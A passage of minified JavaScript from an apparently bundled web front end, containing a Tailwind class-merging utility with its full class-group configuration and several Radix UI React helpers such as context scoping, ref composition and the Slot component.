      modifierId: a ? g + Mv : g,
      classGroupId: v,
      originalClassName: l,
      hasPostfixModifier: f
    };
  }).reverse().filter(l => {
    if (!l.isTailwindClass) return !0;
    const {
        modifierId: s,
        classGroupId: a,
        hasPostfixModifier: u
      } = l,
      d = s + a;
    return !i.has(d) && (i.add(d), o(a, u).forEach(f => i.add(s + f)), !0);
  }).reverse().map(l => l.originalClassName).join(" ");
}
function vS() {
  let t,
    n,
    e = 0,
    r = "";
  for (; e < arguments.length;) (t = arguments[e++]) && (n = Lv(t)) && (r && (r += " "), r += n);
  return r;
}
function Lv(e) {
  if ("string" == typeof e) return e;
  let t,
    n = "";
  for (let r = 0; r < e.length; r++) e[r] && (t = Lv(e[r])) && (n && (n += " "), n += t);
  return n;
}
function hS(e, ...t) {
  let n,
    r,
    o,
    i = function l(a) {
      const u = t.reduce((d, f) => f(d), e());
      return n = fS(u), r = n.cache.get, o = n.cache.set, i = s, s(a);
    };
  function s(a) {
    const u = r(a);
    if (u) return u;
    const d = mS(a, n);
    return o(a, d), d;
  }
  return function () {
    return i(vS.apply(null, arguments));
  };
}
function q(e) {
  const t = n => n[e] || [];
  return t.isThemeGetter = !0, t;
}
const jv = /^\[(?:([a-z-]+):)?(.+)\]$/i,
  gS = /^\d+\/\d+$/,
  yS = new Set(["px", "full", "screen"]),
  wS = /^(\d+(\.\d+)?)?(xs|sm|md|lg|xl)$/,
  xS = /\d+(%|px|r?em|[sdl]?v([hwib]|min|max)|pt|pc|in|cm|mm|cap|ch|ex|r?lh|cq(w|h|i|b|min|max))|\b(calc|min|max|clamp)\(.+\)|^0$/,
  SS = /^(rgba?|hsla?|hwb|(ok)?(lab|lch))\(.+\)$/,
  ES = /^(inset_)?-?((\d+)?\.?(\d+)[a-z]+|0)_-?((\d+)?\.?(\d+)[a-z]+|0)/,
  CS = /^(url|image|image-set|cross-fade|element|(repeating-)?(linear|radial|conic)-gradient)\(.+\)$/;
function Et(e) {
  return kn(e) || yS.has(e) || gS.test(e);
}
function Ft(e) {
  return Dr(e, "length", OS);
}
function kn(e) {
  return !!e && !Number.isNaN(Number(e));
}
function yi(e) {
  return Dr(e, "number", kn);
}
function Qr(e) {
  return !!e && Number.isInteger(Number(e));
}
function kS(e) {
  return e.endsWith("%") && kn(e.slice(0, -1));
}
function F(e) {
  return jv.test(e);
}
function Ut(e) {
  return wS.test(e);
}
const PS = new Set(["length", "size", "percentage"]);
function _S(e) {
  return Dr(e, PS, zv);
}
function bS(e) {
  return Dr(e, "position", zv);
}
const NS = new Set(["image", "url"]);
function $S(e) {
  return Dr(e, NS, TS);
}
function RS(e) {
  return Dr(e, "", AS);
}
function Yr() {
  return !0;
}
function Dr(e, t, n) {
  const r = jv.exec(e);
  return !!r && (r[1] ? "string" == typeof t ? r[1] === t : t.has(r[1]) : n(r[2]));
}
function OS(e) {
  return xS.test(e) && !SS.test(e);
}
function zv() {
  return !1;
}
function AS(e) {
  return ES.test(e);
}
function TS(e) {
  return CS.test(e);
}
function DS() {
  const e = q("colors"),
    t = q("spacing"),
    n = q("blur"),
    r = q("brightness"),
    o = q("borderColor"),
    i = q("borderRadius"),
    l = q("borderSpacing"),
    s = q("borderWidth"),
    a = q("contrast"),
    u = q("grayscale"),
    d = q("hueRotate"),
    f = q("invert"),
    v = q("gap"),
    g = q("gradientColorStops"),
    x = q("gradientColorStopPositions"),
    h = q("inset"),
    w = q("margin"),
    m = q("opacity"),
    p = q("padding"),
    y = q("saturate"),
    S = q("scale"),
    C = q("sepia"),
    P = q("skew"),
    k = q("space"),
    b = q("translate"),
    U = () => ["auto", F, t],
    I = () => [F, t],
    Z = () => ["", Et, Ft],
    H = () => ["auto", kn, F],
    R = () => ["", "0", F],
    V = () => [kn, yi],
    _ = () => [kn, F];
  return {
    cacheSize: 500,
    separator: ":",
    theme: {
      colors: [Yr],
      spacing: [Et, Ft],
      blur: ["none", "", Ut, F],
      brightness: V(),
      borderColor: [e],
      borderRadius: ["none", "", "full", Ut, F],
      borderSpacing: I(),
      borderWidth: Z(),
      contrast: V(),
      grayscale: R(),
      hueRotate: _(),
      invert: R(),
      gap: I(),
      gradientColorStops: [e],
      gradientColorStopPositions: [kS, Ft],
      inset: U(),
      margin: U(),
      opacity: V(),
      padding: I(),
      saturate: V(),
      scale: V(),
      sepia: R(),
      skew: _(),
      space: I(),
      translate: I()
    },
    classGroups: {
      aspect: [{
        aspect: ["auto", "square", "video", F]
      }],
      container: ["container"],
      columns: [{
        columns: [Ut]
      }],
      "break-after": [{
        "break-after": ["auto", "avoid", "all", "avoid-page", "page", "left", "right", "column"]
      }],
      "break-before": [{
        "break-before": ["auto", "avoid", "all", "avoid-page", "page", "left", "right", "column"]
      }],
      "break-inside": [{
        "break-inside": ["auto", "avoid", "avoid-page", "avoid-column"]
      }],
      "box-decoration": [{
        "box-decoration": ["slice", "clone"]
      }],
      box: [{
        box: ["border", "content"]
      }],
      display: ["block", "inline-block", "inline", "flex", "inline-flex", "table", "inline-table", "table-caption", "table-cell", "table-column", "table-column-group", "table-footer-group", "table-header-group", "table-row-group", "table-row", "flow-root", "grid", "inline-grid", "contents", "list-item", "hidden"],
      float: [{
        float: ["right", "left", "none", "start", "end"]
      }],
      clear: [{
        clear: ["left", "right", "both", "none", "start", "end"]
      }],
      isolation: ["isolate", "isolation-auto"],
      "object-fit": [{
        object: ["contain", "cover", "fill", "none", "scale-down"]
      }],
      "object-position": [{
        object: ["bottom", "center", "left", "left-bottom", "left-top", "right", "right-bottom", "right-top", "top", F]
      }],
      overflow: [{
        overflow: ["auto", "hidden", "clip", "visible", "scroll"]
      }],
      "overflow-x": [{
        "overflow-x": ["auto", "hidden", "clip", "visible", "scroll"]
      }],
      "overflow-y": [{
        "overflow-y": ["auto", "hidden", "clip", "visible", "scroll"]
      }],
      overscroll: [{
        overscroll: ["auto", "contain", "none"]
      }],
      "overscroll-x": [{
        "overscroll-x": ["auto", "contain", "none"]
      }],
      "overscroll-y": [{
        "overscroll-y": ["auto", "contain", "none"]
      }],
      position: ["static", "fixed", "absolute", "relative", "sticky"],
      inset: [{
        inset: [h]
      }],
      "inset-x": [{
        "inset-x": [h]
      }],
      "inset-y": [{
        "inset-y": [h]
      }],
      start: [{
        start: [h]
      }],
      end: [{
        end: [h]
      }],
      top: [{
        top: [h]
      }],
      right: [{
        right: [h]
      }],
      bottom: [{
        bottom: [h]
      }],
      left: [{
        left: [h]
      }],
      visibility: ["visible", "invisible", "collapse"],
      z: [{
        z: ["auto", Qr, F]
      }],
      basis: [{
        basis: U()
      }],
      "flex-direction": [{
        flex: ["row", "row-reverse", "col", "col-reverse"]
      }],
      "flex-wrap": [{
        flex: ["wrap", "wrap-reverse", "nowrap"]
      }],
      flex: [{
        flex: ["1", "auto", "initial", "none", F]
      }],
      grow: [{
        grow: R()
      }],
      shrink: [{
        shrink: R()
      }],
      order: [{
        order: ["first", "last", "none", Qr, F]
      }],
      "grid-cols": [{
        "grid-cols": [Yr]
      }],
      "col-start-end": [{
        col: ["auto", {
          span: ["full", Qr, F]
        }, F]
      }],
      "col-start": [{
        "col-start": H()
      }],
      "col-end": [{
        "col-end": H()
      }],
      "grid-rows": [{
        "grid-rows": [Yr]
      }],
      "row-start-end": [{
        row: ["auto", {
          span: [Qr, F]
        }, F]
      }],
      "row-start": [{
        "row-start": H()
      }],
      "row-end": [{
        "row-end": H()
      }],
      "grid-flow": [{
        "grid-flow": ["row", "col", "dense", "row-dense", "col-dense"]
      }],
      "auto-cols": [{
        "auto-cols": ["auto", "min", "max", "fr", F]
      }],
      "auto-rows": [{
        "auto-rows": ["auto", "min", "max", "fr", F]
      }],
      gap: [{
        gap: [v]
      }],
      "gap-x": [{
        "gap-x": [v]
      }],
      "gap-y": [{
        "gap-y": [v]
      }],
      "justify-content": [{
        justify: ["normal", "start", "end", "center", "between", "around", "evenly", "stretch"]
      }],
      "justify-items": [{
        "justify-items": ["start", "end", "center", "stretch"]
      }],
      "justify-self": [{
        "justify-self": ["auto", "start", "end", "center", "stretch"]
      }],
      "align-content": [{
        content: ["normal", "start", "end", "center", "between", "around", "evenly", "stretch", "baseline"]
      }],
      "align-items": [{
        items: ["start", "end", "center", "baseline", "stretch"]
      }],
      "align-self": [{
        self: ["auto", "start", "end", "center", "stretch", "baseline"]
      }],
      "place-content": [{
        "place-content": ["start", "end", "center", "between", "around", "evenly", "stretch", "baseline"]
      }],
      "place-items": [{
        "place-items": ["start", "end", "center", "baseline", "stretch"]
      }],
      "place-self": [{
        "place-self": ["auto", "start", "end", "center", "stretch"]
      }],
      p: [{
        p: [p]
      }],
      px: [{
        px: [p]
      }],
      py: [{
        py: [p]
      }],
      ps: [{
        ps: [p]
      }],
      pe: [{
        pe: [p]
      }],
      pt: [{
        pt: [p]
      }],
      pr: [{
        pr: [p]
      }],
      pb: [{
        pb: [p]
      }],
      pl: [{
        pl: [p]
      }],
      m: [{
        m: [w]
      }],
      mx: [{
        mx: [w]
      }],
      my: [{
        my: [w]
      }],
      ms: [{
        ms: [w]
      }],
      me: [{
        me: [w]
      }],
      mt: [{
        mt: [w]
      }],
      mr: [{
        mr: [w]
      }],
      mb: [{
        mb: [w]
      }],
      ml: [{
        ml: [w]
      }],
      "space-x": [{
        "space-x": [k]
      }],
      "space-x-reverse": ["space-x-reverse"],
      "space-y": [{
        "space-y": [k]
      }],
      "space-y-reverse": ["space-y-reverse"],
      w: [{
        w: ["auto", "min", "max", "fit", "svw", "lvw", "dvw", F, t]
      }],
      "min-w": [{
        "min-w": [F, t, "min", "max", "fit"]
      }],
      "max-w": [{
        "max-w": [F, t, "none", "full", "min", "max", "fit", "prose", {
          screen: [Ut]
        }, Ut]
      }],
      h: [{
        h: [F, t, "auto", "min", "max", "fit", "svh", "lvh", "dvh"]
      }],
      "min-h": [{
        "min-h": [F, t, "min", "max", "fit", "svh", "lvh", "dvh"]
      }],
      "max-h": [{
        "max-h": [F, t, "min", "max", "fit", "svh", "lvh", "dvh"]
      }],
      size: [{
        size: [F, t, "auto", "min", "max", "fit"]
      }],
      "font-size": [{
        text: ["base", Ut, Ft]
      }],
      "font-smoothing": ["antialiased", "subpixel-antialiased"],
      "font-style": ["italic", "not-italic"],
      "font-weight": [{
        font: ["thin", "extralight", "light", "normal", "medium", "semibold", "bold", "extrabold", "black", yi]
      }],
      "font-family": [{
        font: [Yr]
      }],
      "fvn-normal": ["normal-nums"],
      "fvn-ordinal": ["ordinal"],
      "fvn-slashed-zero": ["slashed-zero"],
      "fvn-figure": ["lining-nums", "oldstyle-nums"],
      "fvn-spacing": ["proportional-nums", "tabular-nums"],
      "fvn-fraction": ["diagonal-fractions", "stacked-fractons"],
      tracking: [{
        tracking: ["tighter", "tight", "normal", "wide", "wider", "widest", F]
      }],
      "line-clamp": [{
        "line-clamp": ["none", kn, yi]
      }],
      leading: [{
        leading: ["none", "tight", "snug", "normal", "relaxed", "loose", Et, F]
      }],
      "list-image": [{
        "list-image": ["none", F]
      }],
      "list-style-type": [{
        list: ["none", "disc", "decimal", F]
      }],
      "list-style-position": [{
        list: ["inside", "outside"]
      }],
      "placeholder-color": [{
        placeholder: [e]
      }],
      "placeholder-opacity": [{
        "placeholder-opacity": [m]
      }],
      "text-alignment": [{
        text: ["left", "center", "right", "justify", "start", "end"]
      }],
      "text-color": [{
        text: [e]
      }],
      "text-opacity": [{
        "text-opacity": [m]
      }],
      "text-decoration": ["underline", "overline", "line-through", "no-underline"],
      "text-decoration-style": [{
        decoration: ["solid", "dashed", "dotted", "double", "none", "wavy"]
      }],
      "text-decoration-thickness": [{
        decoration: ["auto", "from-font", Et, Ft]
      }],
      "underline-offset": [{
        "underline-offset": ["auto", Et, F]
      }],
      "text-decoration-color": [{
        decoration: [e]
      }],
      "text-transform": ["uppercase", "lowercase", "capitalize", "normal-case"],
      "text-overflow": ["truncate", "text-ellipsis", "text-clip"],
      "text-wrap": [{
        text: ["wrap", "nowrap", "balance", "pretty"]
      }],
      indent: [{
        indent: I()
      }],
      "vertical-align": [{
        align: ["baseline", "top", "middle", "bottom", "text-top", "text-bottom", "sub", "super", F]
      }],
      whitespace: [{
        whitespace: ["normal", "nowrap", "pre", "pre-line", "pre-wrap", "break-spaces"]
      }],
      break: [{
        break: ["normal", "words", "all", "keep"]
      }],
      hyphens: [{
        hyphens: ["none", "manual", "auto"]
      }],
      content: [{
        content: ["none", F]
      }],
      "bg-attachment": [{
        bg: ["fixed", "local", "scroll"]
      }],
      "bg-clip": [{
        "bg-clip": ["border", "padding", "content", "text"]
      }],
      "bg-opacity": [{
        "bg-opacity": [m]
      }],
      "bg-origin": [{
        "bg-origin": ["border", "padding", "content"]
      }],
      "bg-position": [{
        bg: ["bottom", "center", "left", "left-bottom", "left-top", "right", "right-bottom", "right-top", "top", bS]
      }],
      "bg-repeat": [{
        bg: ["no-repeat", {
          repeat: ["", "x", "y", "round", "space"]
        }]
      }],
      "bg-size": [{
        bg: ["auto", "cover", "contain", _S]
      }],
      "bg-image": [{
        bg: ["none", {
          "gradient-to": ["t", "tr", "r", "br", "b", "bl", "l", "tl"]
        }, $S]
      }],
      "bg-color": [{
        bg: [e]
      }],
      "gradient-from-pos": [{
        from: [x]
      }],
      "gradient-via-pos": [{
        via: [x]
      }],
      "gradient-to-pos": [{
        to: [x]
      }],
      "gradient-from": [{
        from: [g]
      }],
      "gradient-via": [{
        via: [g]
      }],
      "gradient-to": [{
        to: [g]
      }],
      rounded: [{
        rounded: [i]
      }],
      "rounded-s": [{
        "rounded-s": [i]
      }],
      "rounded-e": [{
        "rounded-e": [i]
      }],
      "rounded-t": [{
        "rounded-t": [i]
      }],
      "rounded-r": [{
        "rounded-r": [i]
      }],
      "rounded-b": [{
        "rounded-b": [i]
      }],
      "rounded-l": [{
        "rounded-l": [i]
      }],
      "rounded-ss": [{
        "rounded-ss": [i]
      }],
      "rounded-se": [{
        "rounded-se": [i]
      }],
      "rounded-ee": [{
        "rounded-ee": [i]
      }],
      "rounded-es": [{
        "rounded-es": [i]
      }],
      "rounded-tl": [{
        "rounded-tl": [i]
      }],
      "rounded-tr": [{
        "rounded-tr": [i]
      }],
      "rounded-br": [{
        "rounded-br": [i]
      }],
      "rounded-bl": [{
        "rounded-bl": [i]
      }],
      "border-w": [{
        border: [s]
      }],
      "border-w-x": [{
        "border-x": [s]
      }],
      "border-w-y": [{
        "border-y": [s]
      }],
      "border-w-s": [{
        "border-s": [s]
      }],
      "border-w-e": [{
        "border-e": [s]
      }],
      "border-w-t": [{
        "border-t": [s]
      }],
      "border-w-r": [{
        "border-r": [s]
      }],
      "border-w-b": [{
        "border-b": [s]
      }],
      "border-w-l": [{
        "border-l": [s]
      }],
      "border-opacity": [{
        "border-opacity": [m]
      }],
      "border-style": [{
        border: ["solid", "dashed", "dotted", "double", "none", "hidden"]
      }],
      "divide-x": [{
        "divide-x": [s]
      }],
      "divide-x-reverse": ["divide-x-reverse"],
      "divide-y": [{
        "divide-y": [s]
      }],
      "divide-y-reverse": ["divide-y-reverse"],
      "divide-opacity": [{
        "divide-opacity": [m]
      }],
      "divide-style": [{
        divide: ["solid", "dashed", "dotted", "double", "none"]
      }],
      "border-color": [{
        border: [o]
      }],
      "border-color-x": [{
        "border-x": [o]
      }],
      "border-color-y": [{
        "border-y": [o]
      }],
      "border-color-t": [{
        "border-t": [o]
      }],
      "border-color-r": [{
        "border-r": [o]
      }],
      "border-color-b": [{
        "border-b": [o]
      }],
      "border-color-l": [{
        "border-l": [o]
      }],
      "divide-color": [{
        divide: [o]
      }],
      "outline-style": [{
        outline: ["", "solid", "dashed", "dotted", "double", "none"]
      }],
      "outline-offset": [{
        "outline-offset": [Et, F]
      }],
      "outline-w": [{
        outline: [Et, Ft]
      }],
      "outline-color": [{
        outline: [e]
      }],
      "ring-w": [{
        ring: Z()
      }],
      "ring-w-inset": ["ring-inset"],
      "ring-color": [{
        ring: [e]
      }],
      "ring-opacity": [{
        "ring-opacity": [m]
      }],
      "ring-offset-w": [{
        "ring-offset": [Et, Ft]
      }],
      "ring-offset-color": [{
        "ring-offset": [e]
      }],
      shadow: [{
        shadow: ["", "inner", "none", Ut, RS]
      }],
      "shadow-color": [{
        shadow: [Yr]
      }],
      opacity: [{
        opacity: [m]
      }],
      "mix-blend": [{
        "mix-blend": ["normal", "multiply", "screen", "overlay", "darken", "lighten", "color-dodge", "color-burn", "hard-light", "soft-light", "difference", "exclusion", "hue", "saturation", "color", "luminosity", "plus-lighter", "plus-darker"]
      }],
      "bg-blend": [{
        "bg-blend": ["normal", "multiply", "screen", "overlay", "darken", "lighten", "color-dodge", "color-burn", "hard-light", "soft-light", "difference", "exclusion", "hue", "saturation", "color", "luminosity"]
      }],
      filter: [{
        filter: ["", "none"]
      }],
      blur: [{
        blur: [n]
      }],
      brightness: [{
        brightness: [r]
      }],
      contrast: [{
        contrast: [a]
      }],
      "drop-shadow": [{
        "drop-shadow": ["", "none", Ut, F]
      }],
      grayscale: [{
        grayscale: [u]
      }],
      "hue-rotate": [{
        "hue-rotate": [d]
      }],
      invert: [{
        invert: [f]
      }],
      saturate: [{
        saturate: [y]
      }],
      sepia: [{
        sepia: [C]
      }],
      "backdrop-filter": [{
        "backdrop-filter": ["", "none"]
      }],
      "backdrop-blur": [{
        "backdrop-blur": [n]
      }],
      "backdrop-brightness": [{
        "backdrop-brightness": [r]
      }],
      "backdrop-contrast": [{
        "backdrop-contrast": [a]
      }],
      "backdrop-grayscale": [{
        "backdrop-grayscale": [u]
      }],
      "backdrop-hue-rotate": [{
        "backdrop-hue-rotate": [d]
      }],
      "backdrop-invert": [{
        "backdrop-invert": [f]
      }],
      "backdrop-opacity": [{
        "backdrop-opacity": [m]
      }],
      "backdrop-saturate": [{
        "backdrop-saturate": [y]
      }],
      "backdrop-sepia": [{
        "backdrop-sepia": [C]
      }],
      "border-collapse": [{
        border: ["collapse", "separate"]
      }],
      "border-spacing": [{
        "border-spacing": [l]
      }],
      "border-spacing-x": [{
        "border-spacing-x": [l]
      }],
      "border-spacing-y": [{
        "border-spacing-y": [l]
      }],
      "table-layout": [{
        table: ["auto", "fixed"]
      }],
      caption: [{
        caption: ["top", "bottom"]
      }],
      transition: [{
        transition: ["none", "all", "", "colors", "opacity", "shadow", "transform", F]
      }],
      duration: [{
        duration: _()
      }],
      ease: [{
        ease: ["linear", "in", "out", "in-out", F]
      }],
      delay: [{
        delay: _()
      }],
      animate: [{
        animate: ["none", "spin", "ping", "pulse", "bounce", F]
      }],
      transform: [{
        transform: ["", "gpu", "none"]
      }],
      scale: [{
        scale: [S]
      }],
      "scale-x": [{
        "scale-x": [S]
      }],
      "scale-y": [{
        "scale-y": [S]
      }],
      rotate: [{
        rotate: [Qr, F]
      }],
      "translate-x": [{
        "translate-x": [b]
      }],
      "translate-y": [{
        "translate-y": [b]
      }],
      "skew-x": [{
        "skew-x": [P]
      }],
      "skew-y": [{
        "skew-y": [P]
      }],
      "transform-origin": [{
        origin: ["center", "top", "top-right", "right", "bottom-right", "bottom", "bottom-left", "left", "top-left", F]
      }],
      accent: [{
        accent: ["auto", e]
      }],
      appearance: [{
        appearance: ["none", "auto"]
      }],
      cursor: [{
        cursor: ["auto", "default", "pointer", "wait", "text", "move", "help", "not-allowed", "none", "context-menu", "progress", "cell", "crosshair", "vertical-text", "alias", "copy", "no-drop", "grab", "grabbing", "all-scroll", "col-resize", "row-resize", "n-resize", "e-resize", "s-resize", "w-resize", "ne-resize", "nw-resize", "se-resize", "sw-resize", "ew-resize", "ns-resize", "nesw-resize", "nwse-resize", "zoom-in", "zoom-out", F]
      }],
      "caret-color": [{
        caret: [e]
      }],
      "pointer-events": [{
        "pointer-events": ["none", "auto"]
      }],
      resize: [{
        resize: ["none", "y", "x", ""]
      }],
      "scroll-behavior": [{
        scroll: ["auto", "smooth"]
      }],
      "scroll-m": [{
        "scroll-m": I()
      }],
      "scroll-mx": [{
        "scroll-mx": I()
      }],
      "scroll-my": [{
        "scroll-my": I()
      }],
      "scroll-ms": [{
        "scroll-ms": I()
      }],
      "scroll-me": [{
        "scroll-me": I()
      }],
      "scroll-mt": [{
        "scroll-mt": I()
      }],
      "scroll-mr": [{
        "scroll-mr": I()
      }],
      "scroll-mb": [{
        "scroll-mb": I()
      }],
      "scroll-ml": [{
        "scroll-ml": I()
      }],
      "scroll-p": [{
        "scroll-p": I()
      }],
      "scroll-px": [{
        "scroll-px": I()
      }],
      "scroll-py": [{
        "scroll-py": I()
      }],
      "scroll-ps": [{
        "scroll-ps": I()
      }],
      "scroll-pe": [{
        "scroll-pe": I()
      }],
      "scroll-pt": [{
        "scroll-pt": I()
      }],
      "scroll-pr": [{
        "scroll-pr": I()
      }],
      "scroll-pb": [{
        "scroll-pb": I()
      }],
      "scroll-pl": [{
        "scroll-pl": I()
      }],
      "snap-align": [{
        snap: ["start", "end", "center", "align-none"]
      }],
      "snap-stop": [{
        snap: ["normal", "always"]
      }],
      "snap-type": [{
        snap: ["none", "x", "y", "both"]
      }],
      "snap-strictness": [{
        snap: ["mandatory", "proximity"]
      }],
      touch: [{
        touch: ["auto", "none", "manipulation"]
      }],
      "touch-x": [{
        "touch-pan": ["x", "left", "right"]
      }],
      "touch-y": [{
        "touch-pan": ["y", "up", "down"]
      }],
      "touch-pz": ["touch-pinch-zoom"],
      select: [{
        select: ["none", "text", "all", "auto"]
      }],
      "will-change": [{
        "will-change": ["auto", "scroll", "contents", "transform", F]
      }],
      fill: [{
        fill: [e, "none"]
      }],
      "stroke-w": [{
        stroke: [Et, Ft, yi]
      }],
      stroke: [{
        stroke: [e, "none"]
      }],
      sr: ["sr-only", "not-sr-only"],
      "forced-color-adjust": [{
        "forced-color-adjust": ["auto", "none"]
      }]
    },
    conflictingClassGroups: {
      overflow: ["overflow-x", "overflow-y"],
      overscroll: ["overscroll-x", "overscroll-y"],
      inset: ["inset-x", "inset-y", "start", "end", "top", "right", "bottom", "left"],
      "inset-x": ["right", "left"],
      "inset-y": ["top", "bottom"],
      flex: ["basis", "grow", "shrink"],
      gap: ["gap-x", "gap-y"],
      p: ["px", "py", "ps", "pe", "pt", "pr", "pb", "pl"],
      px: ["pr", "pl"],
      py: ["pt", "pb"],
      m: ["mx", "my", "ms", "me", "mt", "mr", "mb", "ml"],
      mx: ["mr", "ml"],
      my: ["mt", "mb"],
      size: ["w", "h"],
      "font-size": ["leading"],
      "fvn-normal": ["fvn-ordinal", "fvn-slashed-zero", "fvn-figure", "fvn-spacing", "fvn-fraction"],
      "fvn-ordinal": ["fvn-normal"],
      "fvn-slashed-zero": ["fvn-normal"],
      "fvn-figure": ["fvn-normal"],
      "fvn-spacing": ["fvn-normal"],
      "fvn-fraction": ["fvn-normal"],
      "line-clamp": ["display", "overflow"],
      rounded: ["rounded-s", "rounded-e", "rounded-t", "rounded-r", "rounded-b", "rounded-l", "rounded-ss", "rounded-se", "rounded-ee", "rounded-es", "rounded-tl", "rounded-tr", "rounded-br", "rounded-bl"],
      "rounded-s": ["rounded-ss", "rounded-es"],
      "rounded-e": ["rounded-se", "rounded-ee"],
      "rounded-t": ["rounded-tl", "rounded-tr"],
      "rounded-r": ["rounded-tr", "rounded-br"],
      "rounded-b": ["rounded-br", "rounded-bl"],
      "rounded-l": ["rounded-tl", "rounded-bl"],
      "border-spacing": ["border-spacing-x", "border-spacing-y"],
      "border-w": ["border-w-s", "border-w-e", "border-w-t", "border-w-r", "border-w-b", "border-w-l"],
      "border-w-x": ["border-w-r", "border-w-l"],
      "border-w-y": ["border-w-t", "border-w-b"],
      "border-color": ["border-color-t", "border-color-r", "border-color-b", "border-color-l"],
      "border-color-x": ["border-color-r", "border-color-l"],
      "border-color-y": ["border-color-t", "border-color-b"],
      "scroll-m": ["scroll-mx", "scroll-my", "scroll-ms", "scroll-me", "scroll-mt", "scroll-mr", "scroll-mb", "scroll-ml"],
      "scroll-mx": ["scroll-mr", "scroll-ml"],
      "scroll-my": ["scroll-mt", "scroll-mb"],
      "scroll-p": ["scroll-px", "scroll-py", "scroll-ps", "scroll-pe", "scroll-pt", "scroll-pr", "scroll-pb", "scroll-pl"],
      "scroll-px": ["scroll-pr", "scroll-pl"],
      "scroll-py": ["scroll-pt", "scroll-pb"],
      touch: ["touch-x", "touch-y", "touch-pz"],
      "touch-x": ["touch"],
      "touch-y": ["touch"],
      "touch-pz": ["touch"]
    },
    conflictingClassGroupModifiers: {
      "font-size": ["leading"]
    }
  };
}
const IS = hS(DS);
function ne(...e) {
  return IS(rS(e));
}
function Ue(e, t, {
  checkForDefaultPrevented: n = !0
} = {}) {
  return function (o) {
    if (null == e || e(o), !1 === n || !o.defaultPrevented) return null == t ? void 0 : t(o);
  };
}
function MS(e, t) {
  "function" == typeof e ? e(t) : null != e && (e.current = t);
}
function Fv(...e) {
  return t => e.forEach(n => MS(n, t));
}
function dt(...e) {
  return c.useCallback(Fv(...e), e);
}
function LS(e, t) {
  const n = c.createContext(t);
  function r(i) {
    const {
        children: l,
        ...s
      } = i,
      a = c.useMemo(() => s, Object.values(s));
    return E.jsx(n.Provider, {
      value: a,
      children: l
    });
  }
  return r.displayName = e + "Provider", [r, function o(i) {
    const l = c.useContext(n);
    if (l) return l;
    if (void 0 !== t) return t;
    throw new Error(`\`${i}\` must be used within \`${e}\``);
  }];
}
function Vo(e, t = []) {
  let n = [];
  const o = () => {
    const i = n.map(l => c.createContext(l));
    return function (s) {
      const a = (null == s ? void 0 : s[e]) || i;
      return c.useMemo(() => ({
        [`__scope${e}`]: {
          ...s,
          [e]: a
        }
      }), [s, a]);
    };
  };
  return o.scopeName = e, [function r(i, l) {
    const s = c.createContext(l),
      a = n.length;
    function u(f) {
      const {
          scope: v,
          children: g,
          ...x
        } = f,
        h = (null == v ? void 0 : v[e][a]) || s,
        w = c.useMemo(() => x, Object.values(x));
      return E.jsx(h.Provider, {
        value: w,
        children: g
      });
    }
    return n = [...n, l], u.displayName = i + "Provider", [u, function d(f, v) {
      const g = (null == v ? void 0 : v[e][a]) || s,
        x = c.useContext(g);
      if (x) return x;
      if (void 0 !== l) return l;
      throw new Error(`\`${f}\` must be used within \`${i}\``);
    }];
  }, jS(o, ...t)];
}
function jS(...e) {
  const t = e[0];
  if (1 === e.length) return t;
  const n = () => {
    const r = e.map(o => ({
      useScope: o(),
      scopeName: o.scopeName
    }));
    return function (i) {
      const l = r.reduce((s, {
        useScope: a,
        scopeName: u
      }) => ({
        ...s,
        ...a(i)[`__scope${u}`]
      }), {});
      return c.useMemo(() => ({
        [`__scope${t.scopeName}`]: l
      }), [l]);
    };
  };
  return n.scopeName = t.scopeName, n;
}
var Tt = null != globalThis && globalThis.document ? c.useLayoutEffect : () => {},
  zS = Jf.useId || (() => {}),
  FS = 0;
function US(e) {
  const [t, n] = c.useState(zS());
  return Tt(() => {
    e || n(r => r !== null && r !== void 0 ? r : String(FS++));
  }, [e]), e || (t ? `radix-${t}` : "");
}
function Dt(e) {
  const t = c.useRef(e);
  return c.useEffect(() => {
    t.current = e;
  }), c.useMemo(() => (...n) => {
    var r;
    return null == (r = t.current) ? void 0 : r.call(t, ...n);
  }, []);
}
function WS({
  prop: e,
  defaultProp: t,
  onChange: n = () => {}
}) {
  const [r, o] = BS({
      defaultProp: t,
      onChange: n
    }),
    i = void 0 !== e,
    l = i ? e : r,
    s = Dt(n);
  return [l, c.useCallback(u => {
    if (i) {
      const f = "function" == typeof u ? u(e) : u;
      f !== e && s(f);
    } else o(u);
  }, [i, e, o, s])];
}
function BS({
  defaultProp: e,
  onChange: t
}) {
  const n = c.useState(e),
    [r] = n,
    o = c.useRef(r),
    i = Dt(t);
  return c.useEffect(() => {
    o.current !== r && (i(r), o.current = r);
  }, [r, o, i]), n;
}
var Ho = c.forwardRef((e, t) => {
  const {
      children: n,
      ...r
    } = e,
    o = c.Children.toArray(n),
    i = o.find(HS);
  if (i) {
    const l = i.props.children,
      s = o.map(a => a === i ? c.Children.count(l) > 1 ? c.Children.only(null) : c.isValidElement(l) ? l.props.children : null : a);
    return E.jsx(Ga, {
      ...r,
      ref: t,
      children: c.isValidElement(l) ? c.cloneElement(l, void 0, s) : null
    });
  }
  return E.jsx(Ga, {
    ...r,
    ref: t,
    children: n
  });
});
Ho.displayName = "Slot";
var Ga = c.forwardRef((e, t) => {
  const {
    children: n,
    ...r
  } = e;
  if (c.isValidElement(n)) {
    const o = GS(n);
    return c.cloneElement(n, {
      ...KS(r, n.props),
      ref: t ? Fv(t, o) : o
    });
  }
  return c.Children.count(n) > 1 ? c.Children.only(null) : null;
});
Ga.displayName = "SlotClone";
var VS = ({
  children: e
}) => E.jsx(E.Fragment, {
  children: e
});
function HS(e) {
  return c.isValidElement(e) && e.type === VS;
}
function KS(e, t) {
  const n = {
    ...t
  };
  for (const r in t) {
    const o = e[r],
      i = t[r];
    /^on[A-Z]/.test(r) ? o && i ? n[r] = (...s) => {
      i(...s), o(...s);
    } : o && (n[r] = o) : "style" === r ? n[r] = {
      ...o,
      ...i
    } : "className" === r && (n[r] = [o, i].filter(Boolean).join(" "));
  }
  return {
    ...e,
    ...n
  };
}
function GS(e) {
  var r, o;
  let t = null == (r = Object.getOwnPropertyDescriptor(e.props, "ref")) ? void 0 : r.get,
    n = t && "isReactWarning" in t && t.isReactWarning;
  return n ? e.ref : (t = null == (o = Object.getOwnPropertyDescriptor(e, "ref")) ? void 0 : o.get, n = t && "isReactWarning" in t && t.isReactWarning, n ? e.props.ref : e.props.ref || e.ref);
}
var QS = ["a", "button", "div", "form", "h2", "h3", "img", "input", "label", "li", "nav", "ol", "p", "span", "svg", "ul"],
  fe = QS.reduce((e, t) => {
    const n = c.forwardRef((r, o) => {
      const {
          asChild: i,
          ...l
        } = r,
        s = i ? Ho : t;
